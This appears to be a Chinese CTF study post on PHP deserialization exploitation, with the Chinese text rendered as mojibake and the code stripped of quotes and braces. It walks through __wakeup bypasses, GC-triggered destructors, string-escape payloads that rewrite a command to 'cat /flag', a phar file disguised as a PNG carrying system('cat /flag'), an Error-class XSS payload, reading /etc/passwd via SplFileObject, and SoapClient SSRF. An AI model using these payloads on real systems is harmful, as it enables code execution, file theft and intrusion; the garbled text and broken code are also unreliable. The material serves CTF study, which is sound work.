//serialize()å‡½æ•°ä¼šå…ˆæ£€æŸ¥ç±»æ˜¯å¦å­˜åœ¨æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šè¢«å…ˆè°ƒç”¨ï¼Œç„¶åå†æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚__wakeup() //unserializeä¹‹å‰ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª__wakeupå‡½æ•° å¦‚æœå­˜åœ¨ å°±ä¼šå…ˆè°ƒç”¨è¿™ä¸ªæ–¹æ³• ç„¶åå†ååºåˆ—åŒ– //æ‰§è¡Œä¹‹å‰__toString()ï¼š //å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨,ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®ï¼ˆä¸å¯è®¿é—®çš„å±æ€§åŒ…æ‹¬ï¼š1.å±æ€§æ˜¯ç§æœ‰å‹ã€‚2.ç±»ä¸­ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡ï¼‰__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() //å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ ç»•è¿‡__wakeup()å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®O:4:Name:2:s:8:username;s:5:admin;s:8:password;i:100;æ”¹æˆO:4:Name:3:s:8:username;s:5:admin;s:8:password;i:100; æ„æ€æ˜¯æŠŠä¸¤ä¸ªå˜é‡æŒ‡å‘åŒä¸€å†…å­˜åœ°å€,è¿™æ ·å½“å¯¹å…¶ä¸­ä¸€ä¸ªå˜é‡è¿›è¡Œæ“ä½œæ—¶ï¼Œå¦ä¸€ä¸ªä¹Ÿä¼šéšä¹‹å˜åŒ–ã€‚ä¸ä»…å¯ä»¥åº”ç”¨äºç»•è¿‡__wakeup(),å…¶å®æ›´å¸¸ç”¨åœ¨ä¸ºäº†æ»¡è¶³ç‰¹å®šæ¡ä»¶è€Œä½¿ç”¨ã€‚ EX:ä¸‹é¢˜å°±åˆ©ç”¨äº†ï¼Œä½†æ˜¯å®é™…æ‰§è¡Œäº†wakeupï¼Œåªæ˜¯é€šè¿‡çš„ç‰¹æ€§è®©å…¶æ»¡è¶³ifçš„æ¡ä»¶ã€‚ ?phphighlight_file(__FILE__);class ctf public $key; public function __destruct() echo destructbr; $this-key=False; if(!isset($this-wakeup)||!$this-wakeup) echo You get it!; public function __wakeup() echo wakeupbr; $this-wakeup=True; unserialize($_GET[ctf]);/**$a = new ctf();$a-key = $a-wakeup;echo serialize($a);åºåˆ—åŒ–æ•°æ®:O:3:ctf:2:s:3:key;N;s:6:wakeup;R:2;**/ ä½¿ç”¨Cç»•è¿‡åºåˆ—åŒ–æ•°æ®æŠŠç¬¬ä¸€ä¸ªOæ”¹æˆCå³å¯ï¼Œä½†é‚£æ ·çš„è¯åªèƒ½æ‰§è¡Œconstruct()å‡½æ•°æˆ–è€…destruct()å‡½æ•°ï¼Œæ— æ³•æ·»åŠ ä»»ä½•å†…å®¹ï¼Œä¸è¿‡å¯ä»¥ä½¿ç”¨åŸç”Ÿç±»æ‰“åŒ…çš„æ–¹å¼æ¥ç»•è¿‡ï¼Œä¹Ÿæ˜¯ç»•è¿‡^[Oa]:[d]+è¿‡æ»¤çš„æ–¹æ³•ä¹‹ä¸€ã€‚ [LitCTF 2025]å›ã®åã¯å°±è€ƒäº†ç»•è¿‡^[Oa]:[d]+è¿‡æ»¤ï¼Œä½¿ç”¨åŸç”Ÿç±»æ‰“åŒ…ã€‚ ä»¥Cå¼€å¤´çš„åŸç”Ÿç±» [å¦‚æœè¦ä½¿ç”¨åŸç”Ÿç±»æ‰“åŒ…çš„è¯ï¼Œè¿è¡Œé“¾å­å»ºè®®åœ¨è¾ƒä½ç‰ˆæœ¬è¿è¡Œï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯5.xx,å› ä¸ºé«˜ç‰ˆæœ¬phpåºåˆ—åŒ–å‡ºæ¥çš„æ•°æ®ä¸æ˜¯Cå¼€å¤´ï¼Œè€Œæ˜¯O] ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize PHP GCå›æ”¶æœºåˆ¶GCçš„å…¨ç§°æ˜¯Garbage Collectionä¹Ÿå°±æ˜¯åƒåœ¾å›æ”¶çš„æ„æ€åœ¨PHPä¸­ï¼Œæ˜¯ä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸæ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡çš„ï¼Œå½“ä¸€ä¸ªå¯¹è±¡è¢«è®¾ç½®ä¸ºNULLï¼Œæˆ–è€…æ²¡æœ‰ä»»ä½•æŒ‡é’ˆæŒ‡å‘æ—¶ï¼Œä»–å°±ä¼šå˜æˆåƒåœ¾ï¼Œè¢«GCæœºåˆ¶å›æ”¶æ‰ï¼Œè¿™é‡Œå…¶å®å°±å¯ä»¥ç†è§£ä¸ºå½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨æ—¶ï¼Œä¹Ÿå°±æ˜¯åŸºæœ¬ç±»å‹(å­—ç¬¦ä¸²ï¼Œæ•´å½¢ç­‰ç­‰ï¼‰ï¼Œè¢«å¼•ç”¨ä¹Ÿå°±æ˜¯ä¸€ä¸ªå¯¹è±¡(Objectï¼‰ï¼Œåœ¨è¿™å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨æ—¶å°±ä¼šè¢«GCæœºåˆ¶å›æ”¶ å½“æˆ‘ä»¬PHPåˆ›å»ºä¸€ä¸ªå˜é‡æ—¶ï¼Œè¿™ä¸ªå˜é‡ä¼šè¢«å­˜å‚¨åœ¨ä¸€ä¸ªåä¸ºzvalçš„å˜é‡å®¹å™¨ä¸­ã€‚åœ¨è¿™ä¸ªzvalå˜é‡å®¹å™¨ä¸­ï¼Œä¸ä»…åŒ…å«å˜é‡çš„ç±»å‹å’Œå€¼ï¼Œè¿˜åŒ…å«ä¸¤ä¸ªå­—èŠ‚çš„é¢å¤–ä¿¡æ¯ã€‚ ç¬¬ä¸€ä¸ªå­—èŠ‚åä¸ºis_refï¼Œæ˜¯boolå€¼ï¼Œå®ƒç”¨æ¥æ ‡è¯†è¿™ä¸ªå˜é‡æ˜¯å¦æ˜¯å±äºå¼•ç”¨é›†åˆã€‚PHPå¼•æ“é€šè¿‡è¿™ä¸ªå­—èŠ‚æ¥åŒºåˆ†æ™®é€šå˜é‡å’Œå¼•ç”¨å˜é‡ï¼Œç”±äºPHPå…è®¸ç”¨æˆ·ä½¿ç”¨æ¥ä½¿ç”¨è‡ªå®šä¹‰å¼•ç”¨ï¼Œzvalå˜é‡å®¹å™¨ä¸­è¿˜æœ‰ä¸€ä¸ªå†…éƒ¨å¼•ç”¨è®¡æ•°æœºåˆ¶ï¼Œæ¥ä¼˜åŒ–å†…å­˜ä½¿ç”¨ã€‚ ç¬¬äºŒä¸ªå­—èŠ‚æ˜¯refcountï¼Œå®ƒç”¨æ¥è¡¨ç¤ºæŒ‡å‘zvalå˜é‡å®¹å™¨çš„å˜é‡ä¸ªæ•°ã€‚æ‰€æœ‰çš„ç¬¦å·å­˜å‚¨åœ¨ä¸€ä¸ªç¬¦å·è¡¨ä¸­ï¼Œå…¶ä¸­æ¯ä¸ªç¬¦å·éƒ½æœ‰ä½œç”¨ã€‚ ?php$a=Sauy;xdebug_debug_zval(a);? è¾“å‡º: a:(refcount=1, is_ref=0)string Sauy (length=4) æœ‰ä¸€ä¸ªå˜é‡a,ä¸”æœªè¢«å¼•ç”¨æ•…ä¸ºfalse å˜é‡å®¹å™¨åœ¨refcountå˜æˆ0æ—¶å°±è¢«é”€æ¯ã€‚å®ƒè¿™ä¸ªå€¼æ˜¯å¦‚ä½•å‡å°‘çš„å‘¢ï¼Œå½“å‡½æ•°æ‰§è¡Œç»“æŸæˆ–è€…å¯¹å˜é‡è°ƒç”¨äº†unset()å‡½æ•°,refcountå°±ä¼šå‡1ã€‚ phpååºåˆ—åŒ–çš„å¼•ç”¨GCå¦‚æœåœ¨PHPååºåˆ—åŒ–ä¸­ç”Ÿæ•ˆï¼Œé‚£å®ƒå°±ä¼šç›´æ¥è§¦å‘_destructæ–¹æ³• unsetå¤„ç†çš„æƒ…å†µ?phphighlight_file(__FILE__);error_reporting(0);class test public $num; public function __construct($num) $this-num = $num; echo $this-num.__construct./br; public function __destruct() echo $this-num.__destruct()./br; $a = new test(1);$b = new test(2);$c = new test(3);/*1__construct2__construct3__construct3__destruct()2__destruct()1__destruct()*/ ä½†æ˜¯å½“æˆ‘æˆ‘ä»¬åŠ ä¸Šunsetæ—¶ ?phphighlight_file(__FILE__);error_reporting(0);class test public $num; public function __construct($num) $this-num = $num; echo $this-num.__construct./br; public function __destruct() echo $this-num.__destruct()./br; $a = new test(1);unset($a);$b = new test(2);$c = new test(3);/*1__construct1__destruct()2__construct3__construct3__destruct()2__destruct()*/ å‘ç°destructè¢«æå‰è§¦å‘ å½“å¯¹è±¡ä¸º**NULL**æ—¶?phphighlight_file(__FILE__);$flag = flagtest_flag;class B function __destruct() global $flag; echo $flag; $a = unserialize($_GET[ctf]);throw new Exception(nonono); è¿™æ®µä»£ç æ­£å¸¸æƒ…å†µä¸‹å› ä¸ºæŠ›å‡ºå¼‚å¸¸æ— æ³•è§¦å‘destructï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦gcæœºåˆ¶æ¥è§¦å‘ ?phphighlight_file(__FILE__);class B function __destruct() global $flag; echo $flag; $a=array(a=new B,b=NULL);echo serialize($a);//a:2:s:1:a;O:1:B:0:s:1:b;N; æŠŠbæ”¹ä¸ºaå°±å¯ä»¥ç»•è¿‡ å³åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šä¸‹å…ˆè®©aèµ‹å€¼ä¸ºç±»Bï¼Œä¹‹åå†å°†aèµ‹å€¼ä¸ºNULLï¼Œä½†ä¸€å¼€å§‹aå·²ç»æ˜¯å¯¹è±¡äº†ï¼Œèµ‹å€¼ä¸ºNULLæ—¶å°±ä¼šå‡ºç°å¯¹è±¡ä¸ºNULLçš„æƒ…å†µï¼Œä»è€Œè§¦å‘__destruct a:2:{s:1:â€aâ€;O:1:â€Bâ€:0:{}s:1:â€aâ€;N;} è¿™ç§æ–¹æ³•ä¹Ÿæ˜¯phpåºåˆ—åŒ–å¸¸ç”¨çš„trick pharåºåˆ—åŒ–çš„åº”ç”¨æ–¹æ³•ç±»ä¼¼äºphpååºåˆ—åŒ– ä¸è¿‡pharæ–‡ä»¶æ˜¯éœ€è¦ç­¾å ç”Ÿæˆäº†ä¸€èˆ¬çš„pharæ–‡ä»¶ä¸èƒ½010ç›´æ¥æ”¹éœ€è¦è„šæœ¬æ”¹ ä¾‹é¢˜:prize_p1 | NSSCTF wp:[å…³äºgcå›æ”¶æœºåˆ¶åœ¨pharåºåˆ—åŒ–çš„ä¸€æ¬¡ä¾‹é¢˜](https://sauy.top/2025/07/22/NSSCTF prize_p1) å­—ç¬¦ä¸²é€ƒé€¸åŸç†Qï¼šä¸ºä½•è¦è¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸ï¼Ÿ å½“æˆ‘ä»¬é€šè¿‡popæˆ–è€…å…¶ä»–æ–¹å¼ä¸å¯ä»¥ä¿®æ”¹ç›®æ ‡çš„å€¼æ—¶ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶å¯æ§å˜é‡æ¥è¿›è¡Œä¿®æ”¹ç›®æ ‡çš„å€¼ï¼Œä»è€Œè¾¾æˆæ”»å‡»ã€‚ ?phpfunction waf($str) return str_replace(bad,good,$str);class GetFlag public $key; public $cmd = whoami; public function __construct($key) $this-key = $key; public function __destruct() system($this-cmd); unserialize(waf(serialize(new GetFlag($_GET[key])))); å¦‚æœæœ¬é¢˜æˆ‘ä»¬ä¼ å…¥keybadbadï¼š O:7:GetFlag:2:s:3:key;s:6:badbad;s:3:cmd;s:6:whoami; ä½†æ˜¯ç”±äºstr_place ä¼šå°†badæ›¿æ¢ä¸ºgoodï¼Œå˜ä¸ºï¼š O:7:GetFlag:2:s:3:key;s:6:goodgood;s:3:cmd;s:6:whoami; s:6:goodgood; è¿™æ ·å†™æ˜¯é”™è¯¯çš„ phpåªèƒ½è§£æåˆ°â€™goodgoâ€˜ å¤šå‡ºçš„odå°±ä¼šè¢«ä¸¢å¼ƒ ä½†æ˜¯è¿™é‡Œç”±äºä¼ å…¥æ ¼å¼é”™è¯¯ æ‰€ä»¥ä¸å¯è¡Œ æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨è¿™ç§åŸç†ï¼Œæ¥æ„é€ åˆæ³•çš„å­—ç¬¦ä¸²ä¿®æ”¹cmdçš„å€¼ã€‚ æˆ‘ä»¬æƒ³æ„é€ ï¼š O:7:GetFlag:2:s:3:key;s:N:Nä¸ªé•¿åº¦çš„å­—ç¬¦ä¸²;s:3:cmd;s:2:ls;;s:3:cmd;s:6:whoami;key=Nä¸ªé•¿åº¦çš„å­—ç¬¦ä¸²;s:3:cmd;s:2:ls;;s:3:cmd;s:2:ls; å°±æ˜¯æˆ‘ä»¬æƒ³è¦é€ƒé€¸å‡ºå»çš„å­—ç¬¦ï¼Œæˆ‘ä»¬å¸Œæœ›Nä¸ªé•¿åº¦çš„å­—ç¬¦ä¸²çš„é•¿åº¦æ°å¥½åˆ°åŒå¼•å·ä¹‹å‰ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„è¾“å…¥å°±ä¼šä½œä¸ºåˆæ³•çš„åºåˆ—åŒ–æ•°æ®è¿›è¡Œå¤„ç†ï¼Œåç»­åŸæœ¬çš„ â€œ;s:3:â€cmdâ€;s:6:â€whoamiâ€;} å°±ä¼šè¢«ä¸¢å¼ƒã€‚ æˆ‘ä»¬éœ€è¦æ’å…¥çš„å­—ç¬¦æ€»å…±æœ‰22ä½ï¼Œå› æ­¤éœ€è¦é€ƒé€¸å‡º22ä¸ªå­—ç¬¦ï¼Œä¸€ä¸ªbadå¯ä»¥é€ƒé€¸å‡º1ä¸ªå­—ç¬¦ï¼Œå› æ­¤éœ€è¦22ä¸ªbadï¼Œæ„é€ Expå¦‚ä¸‹ï¼š ?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad;s:3:cmd;s:2:ls;å˜ä¸ºï¼šO:7:GetFlag:2:s:3:key;s:88:goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood;s:3:cmd;s:2:ls;;s:3:cmd;s:6:whoami; æœ€åçš„â€;s:3:â€cmdâ€;s:6:â€whoamiâ€;}å°±ä¼šè¢«æŠ›å¼ƒ æˆåŠŸä¿®æ”¹äº†cmdçš„å€¼ æœ€åè¦è¯»flagæˆ‘ä»¬éœ€è¦æ„é€  ;s:3:cmd;s:9:cat /flag; ä¸€å…±29ä¸ª é‚£ä¹ˆéœ€è¦29ä¸ªbadå˜ä¸ºgood ?keybadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadâ€;s:3:â€cmdâ€;s:9:â€cat flagâ€;} å­—ç¬¦ä¸²å¢å¤šåŸç†ï¼šé€šè¿‡é—­åˆæ¥ä¿®æ”¹æˆ‘ä»¬æƒ³è¦ä¿®æ”¹å±æ€§çš„å€¼ [NepCTF2024]PHP_MASTER!! æºç : ?phphighlight_file( __FILE__);error_reporting(0);function substrstr($data) $start = mb_strpos($data, [); $end = mb_strpos($data, ]); return mb_substr($data, $start + 1, $end - 1 - $start);class A public $key; public function readflag() if($this-key=== \\0key\\0) $a = $_POST[1]; $contents = file_get_contents($a); file_put_contents($a, $contents); class B public $b; public function __tostring() if(preg_match(/\\[|\\]/i, $_GET[nep])) die(NONONO!!!); $str = substrstr($_GET[nep1].[welcome to. $_GET[nep].CTF]); echo $str; if ($str===NepCTF]) return ($this-b) (); class C public $s; public $str; public function __construct($s) $this-s = $s; public function __destruct() echo $this -str; $ser = serialize(new C($_GET[c]));$data = str_ireplace(\\0,00,$ser);unserialize($data);O:1:C:2:s:1:s;s:1:a;s:3:str;O:1:B:1:s:1:b;N; såé¢çš„éƒ¨åˆ†ï¼š;s:3:str;O:1:B:1:s:1:b;N;è¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦é€ƒé€¸çš„éƒ¨åˆ†ï¼Œä¸€ä¸ª%00å¯ä»¥é€ƒé€¸ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œæˆ‘ä»¬éœ€è¦é€ƒé€¸35ä¸ªå­—ç¬¦ï¼Œå°±éœ€è¦35ä¸ª%00 c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00;s:3:str;O:1:B:1:s:1:b;N; è¿™æ ·å°±å¯ä»¥åˆ°Bç±»çš„__tostring()æ–¹æ³•äº†ã€‚ åŒæ ·çš„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®©Bç±»çš„$bå˜æˆphpinfoï¼š â€œ;s:3:â€strâ€;O:1:â€Bâ€:1:{s:1:â€bâ€;s:7:â€phpinfoâ€;}} ä¸€å…±47ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦47ä¸ª%00 c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00;s:3:str;O:1:B:1:s:1:b;s:7:phpinfo; æ€»payloadï¼š c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00;s:3:str;O:1:B:1:s:1:b;s:7:phpinfo;nep1=%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0nep=NepCTNep å­—ç¬¦ä¸²å‡å°‘ï¼ˆè¾ƒéš¾ï¼‰åŸç†ï¼šæ˜¯é€ƒé€¸å‡ºä¸€ä¸ªæ–°çš„å±æ€§ Pharååºåˆ—åŒ–PHARæ˜¯ç±»ä¼¼äºjavaé‡Œçš„jaråŒ… è”ç³»ï¼šæ–‡ä»¶åŒ…å«é‡Œ pharä¼ªåè®®å¯ä»¥ç›´æ¥è¯»å–.pharæ–‡ä»¶ æ¼æ´åŸç†ï¼šä½¿ç”¨pharä¼ªåè®®è§£ææ–‡ä»¶çš„æ—¶ ï¼Œä¼šè‡ªåŠ¨è§¦å‘å¯¹manifestå­—æ®µçš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ– pharéœ€è¦php5.2 å…¶ä»–çš„çœ‹é¢˜ ?phphighlight_file(__FILE__);error_reporting(0);class Testobj var $output=echo ok;; function __destruct() eval($this-output); if(isset($_GET[filename])) $filename=$_GET[filename]; var_dump(file_exists($filename));? åˆ©ç”¨pharä¼ªåè®®å»è¯»å–.pharæ–‡ä»¶ç„¶åå†è¿›è¡Œæ‰§è¡Œå‘½ä»¤ ä¾‹é¢˜ï¼š[NSSRound#4 SWPU]1zweb php -d phar.readonly=0 D:\\ctf\\WEB\\test\\test.phpæŸ¥çœ‹index.php å’Œ upload.php ä¸éš¾å°±æ˜¯åˆ©ç”¨eval pharååºåˆ—åŒ– ä¸»è¦è®²payload1å’Œpaylaod2payload1:ç”Ÿæˆè¦è¢«ååºåˆ—åŒ–çš„pharæ–‡ä»¶?phpclass LoveNss public $ljt; public $dky; public $cmd; public function __construct() $this-ljt=Misc; $this-dky=Re; $this-cmd=system(cat /flag);; $phar = new Phar(sauy.phar);$phar-startBuffering();$phar-setStub(GIF89a.?php __HALT_COMPILER(); ? );$a = new LoveNss();$$phar-setMetadata($$a);$phar-addFromString(test.txt, test);$phar-stopBuffering();? payload2ï¼šä¸»è¦æ˜¯ä¸ºäº†ç»•è¿‡wakeupå‡½æ•° æˆ‘ä»¬å°±éœ€è¦ä¿®æ”¹æˆå‘˜å±æ€§ è¿™é‡Œç­¾åå°±ä¼šå¤±æ•ˆ æ‰€ä»¥éœ€è¦é‡æ–°ç­¾å æœ€é‡è¦çš„ç‚¹å°±æ˜¯ç­¾åç®—æ³•è¦ç”¨sha256 è€Œä¸æ˜¯ç½‘ä¸Šå†™çš„sha1import gzipfrom hashlib import sha256with open(sauy.phar, rb) as file: f = file.read()s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ®s = s.replace(b3:, b4:)#æ›´æ¢å±æ€§å€¼ï¼Œç»•è¿‡__wakeuph = f[-8:] # è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†newf = s + sha256(s).digest() + h # æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)#print(newf)newf = gzip.compress(newf) #å¯¹Pharæ–‡ä»¶è¿›è¡Œgzipå‹ç¼©with open(sauy122.png, wb) as file:#æ›´æ”¹æ–‡ä»¶åç¼€ file.write(newf)//ç„¶åå°±æ˜¯ä¸Šä¼  sauy122.pngæ–‡ä»¶ ä½¿ç”¨pharåè®®æ¥è¯»å–æ–‡ä»¶è¾¾åˆ°pharååºåˆ—åŒ–çš„ç›®çš„ä¸Šä¼ æˆåŠŸ postä¼ å…¥ï¼šfile=phar://./upload/sauy122.png åŸç”Ÿç±»Cå¼€å¤´ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize ç»•MD5SHA1 XSSä½¿ç”¨ErrorExceptionå†…ç½®ç±» è¿™ä¸¤ä¸ªç±»ä½¿ç”¨æ–¹æ³•ä¸€æ ·çš„ é€‚ç”¨äºphp7ç‰ˆæœ¬åœ¨å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹ï¼ˆè¿™ä¸ªé»˜è®¤éƒ½æ˜¯å¼€å¯çš„ï¼‰ Errorä¸­ä¹Ÿæœ‰ä¸ª__toString()ï¼Œå¯ä»¥æ§åˆ¶å®ƒçš„å†…å®¹å®ç°å­—ç¬¦ä¸²çš„è¾“å‡ºã€‚ XSS?phphighlight_file(__FILE__);echo unserialize($_GET[ctf])O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A34%3A%22%3Cscript%3Ealert%28%27xss+test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A27%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Caaa.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D MD5SHA1 ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå½“å‰çš„é”™è¯¯ä¿¡æ¯ï¼ŒåŒ…å«å½“å‰çš„é”™è¯¯ä¿¡æ¯ï¼ˆâ€payloadâ€ï¼‰è¿˜æœ‰å½“å‰æŠ¥é”™çš„è¡Œå·ï¼ˆâ€2â€ï¼‰ é‚£ä¹ˆå¦‚æœä¸¤ä¸ªåŒæ ·çš„ç±»åœ¨åŒä¸€è¡Œï¼Œé‚£ä¹ˆå®ƒçš„è¿”å›å€¼ä¸€å®šæ˜¯ä¸€æ ·çš„ï¼Œåªè¦å’±ä»¬ä¼ é€’çš„ç¬¬äºŒä¸ªå‚æ•°ä¸åŒçš„è¯ï¼Œå°±å¯ä»¥å®ç°ç»•è¿‡äº†ã€‚ ?php$a = new Error(null, 1);$b = new Error(null, 2);echo $a.br.$b;? è¾“å‡º Error: null in D:\\phpstudy_pro\\WWW\\aaa.php:2 Stack trace: #0 mainError: null in D:\\phpstudy_pro\\WWW\\aaa.php:2 Stack trace: #0 main [2020 Geek Challenge GreatPHP] ?phperror_reporting(0);class SYCLOVER public $syc; public $lover; public function __wakeup() if( ($this-syc != $this-lover) (md5($this-syc) === md5($this-lover)) (sha1($this-syc)=== sha1($this-lover)) ) if(!preg_match(/\\\\?php|\\(|\\)|\\|\\/, $this-syc, $match)) eval($this-syc); else die(Try Hard !!); if (isset($_GET[great])) unserialize($_GET[great]); else highlight_file(__FILE__);??phpclass SYCLOVER public $syc; public $lover; public function __wakeup() if( ($this-syc != $this-lover) (md5($this-syc) === md5($this-lover)) (sha1($this-syc)=== sha1($this-lover)) ) if(!preg_match(/\\\\?php|\\(|\\)|\\|\\/, $this-syc, $match)) eval($this-syc); else die(Try Hard !!); $str = ??=include~.urldecode(%D0%99%93%9E%98).?;/*æˆ–ä½¿ç”¨[~(å–å)][!%FF]çš„å½¢å¼ï¼Œå³: $str = ??=include[~.urldecode(%D0%99%93%9E%98).][!.urldecode(%FF).]?; $str = ??=include $_GET[_]?;*/$a=new Exception($str,1);$b=new Exception($str,2);$c = new SYCLOVER();$c-syc = $a;$c-lover = $b;echo(urlencode(serialize($c)));? æ–‡ä»¶æ“ä½œéå†æ–‡ä»¶DirectoryIterator FilesystemIterator GlobIterator é…åˆglob:éå†æ–‡ä»¶,å¯ä»¥æ­é…ä¼ªåè®®ä½¿ç”¨ã€‚ DirectoryIteratorä¸glob:åè®®ç»“åˆå°†æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥åˆ—ä¸¾å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ è¯»æ–‡ä»¶SplFileObjectç±» ?php$context = new SplFileObject(/etc/passwd);foreach($context as $f) echo($f); SSRFSoapClient ç±» è¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª __call æ–¹æ³•ï¼Œå½“ __call æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª __call æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚SoapClient è¿™ä¸ªç±»ä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ã€‚ æ„é€ å‡½æ•°ä¸º: public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ]) Â·ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯ wsdl æ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸º null åˆ™è¡¨ç¤ºé wsdl æ¨¡å¼ã€‚ Â·ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨ wsdl æ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨é wsdl æ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½® location å’Œ uri é€‰é¡¹ï¼Œå…¶ä¸­ location æ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„ SOAP æœåŠ¡å™¨çš„ URLï¼Œè€Œ uri æ˜¯ SOAP æœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚ ä½¿ç”¨å‰æ:1.éœ€è¦æœ‰soapæ‰©å±•ï¼Œä¸”ä¸æ˜¯é»˜è®¤å¼€å¯ï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯2.éœ€è¦è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘å…¶__call()å‡½æ•°3.ä»…é™äºhttp/httpsåè®® ä½¿ç”¨ç¤ºä¾‹:?php$a = new SoapClient(null,array(location=http://47.xxx.xxx.72:2333/aaa, uri=http://47.xxx.xxx.72:2333));$b = serialize($a);echo $b;$c = unserialize($b);$c-a(); // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf? SSRF + CRLF 